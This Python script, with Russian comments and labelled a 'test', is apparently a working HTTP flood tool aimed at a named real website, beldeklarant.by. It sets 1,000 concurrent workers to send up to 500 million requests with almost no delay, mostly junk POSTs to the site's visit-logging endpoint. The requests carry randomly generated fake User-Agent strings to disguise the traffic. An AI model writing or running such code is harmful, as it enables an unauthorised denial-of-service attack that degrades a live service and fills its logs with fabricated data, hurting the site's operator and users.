import asyncio
import random
import secrets
import string
import time
import uuid
from datetime import datetime, timezone

import aiohttp

# Список проверок: адрес + HTTP-метод + флаг ssl
CHECKS = [
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/log-visit.php", "method": "POST", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=W1K2060431R001488", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/api/vehicles?vin=JTEBR3FJ20K191488", "method": "GET", "ssl": True},
    {"url": "https://beldeklarant.by/", "method": "GET", "ssl": True},
]

TOTAL_REQUESTS = 500000000
DELAY_BETWEEN_REQ = 0.00001
MAX_CONCURRENT = 1000


USER_AGENTS = [
    (
        f"Mozilla/5.0 ({''.join(random.choices(string.ascii_letters + string.digits, k=16))}; "
        f"{''.join(random.choices(string.ascii_letters + string.digits, k=16))}) "
        f"AppleWebKit/{''.join(random.choices(string.digits, k=3))}.0 "
        f"(KHTML, like Gecko) Version/{random.randint(10, 19)}.0 "
        f"Mobile/{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))} "
        f"Safari/{''.join(random.choices(string.digits, k=3))}.{''.join(random.choices(string.digits, k=1))}"
    )
    for _ in range(600)
]


def build_payload(request_num: int, worker_id: int) -> dict:
    iso_string = datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
    return {
        "requestId": f"req-{request_num}-w{worker_id}-{uuid.uuid4().hex}",
        "page": f"/probe/{uuid.uuid4().hex[:12]}",
        "timestamp": iso_string,
        "userAgent": random.choice(USER_AGENTS),
    }


request_counter = 0
success_count = 0
fail_count = 0
counter_lock = asyncio.Lock()


async def worker(session, worker_id):
    global request_counter, success_count, fail_count

    while True:
        async with counter_lock:
            if request_counter >= TOTAL_REQUESTS:
                break
            request_counter += 1
            current_request_num = request_counter

        check_cfg = CHECKS[(current_request_num - 1) % len(CHECKS)]
        payload = build_payload(current_request_num, worker_id)

        try:
            start_time = time.time()
            async with session.request(
                check_cfg["method"],
                check_cfg["url"],
                json=payload,
                timeout=5,
                ssl=check_cfg["ssl"],
            ) as response:
                duration = time.time() - start_time
                if response.status in (200, 201):
                    print(
                        f"[+] Запрос {current_request_num} (Воркер {worker_id}): Успешно"
                        f" (Цель: {check_cfg['url']}, Метод: {check_cfg['method']}, Статус: {response.status}, Время: {duration:.3f}с)"
                    )
                    async with counter_lock:
                        success_count += 1
                else:
                    print(
                        f"[-] Запрос {current_request_num} (Воркер {worker_id}):"
                        f" Сервер вернул код {response.status} для {check_cfg['url']}"
                    )
                    async with counter_lock:
                        fail_count += 1
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(
                f"[!] Запрос {current_request_num} (Воркер {worker_id}): Ошибка соединения"
                f" ({e}) для {check_cfg['url']}"
            )
            async with counter_lock:
                fail_count += 1

        await asyncio.sleep(DELAY_BETWEEN_REQ)


async def main():
    print("[*] Запуск асинхронного теста")
    print(f"[*] Целей для проверки: {len(CHECKS)}")
    print(f"[*] Всего запросов: {TOTAL_REQUESTS}, Одновременных воркеров: {MAX_CONCURRENT}\n")

    connector = aiohttp.TCPConnector(use_dns_cache=True, ttl_dns_cache=3)

    async with aiohttp.ClientSession(connector=connector) as session:
        workers = [
            asyncio.create_task(worker(session, worker_id))
            for worker_id in range(1, MAX_CONCURRENT + 1)
        ]
        await asyncio.gather(*workers)

    print("\n--- Итоги тестирования ---")
    print(f"Успешных запросов: {success_count}")
    print(f"Ошибок/сбоев: {fail_count}")


if __name__ == "__main__":
    import sys

    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

    asyncio.run(main())
